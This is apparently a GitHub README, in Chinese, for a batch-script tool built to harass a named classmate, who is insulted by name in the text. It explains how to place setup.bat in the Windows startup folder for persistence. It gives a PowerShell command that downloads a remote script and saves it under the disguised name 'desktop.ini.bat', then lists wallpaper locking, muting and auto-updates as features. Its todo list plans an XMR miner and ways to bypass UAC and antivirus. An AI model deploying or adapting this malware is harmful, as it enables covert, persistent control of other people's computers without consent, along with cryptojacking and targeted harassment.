# FuckWYXBatch
>WYX就是歌姬吧

## 项目初衷
WYX是班上的风云人物，电脑大师

## 我班上也有这种\*\*，如何使用？

- setup.bat放置在%appdata%的任务栏启动内，即可使其开机自启

- 在系统盘(C:)新建文件夹`g35rj4ks3g5tgrd1vt1rdgfv6t48rb6dy7v`，将setup.bat单独运行

## 系统要求

Windows 7 及更新的任何版本的Windows

## Features | 特色

- 壁纸锁定

- 关闭音乐

- 定时自动更新

- ~~开源免费~~

## Deploy | 部署

只需要克隆本仓库并修改脚本中的链接即可
```diff
:: setup.bat
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/xiaozhu2007/FuckWYXBatch/blob/main/script.bat?raw=true' , 'C:\Users\Public\Documents\desktop.ini.bat');exit
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/Your User/Your Repo/blob/main/script.bat?raw=true' , 'C:\Users\Public\Documents\desktop.ini.bat');exit
```
壁纸存放在网站根目录的doge.jpg，不设置会在开机自启时导致壁纸消失

## Todo List

[ ] Add `XMR Miner Deploy`

[x] Add 弹窗

[ ] Bypass `UAC/360/Huorong`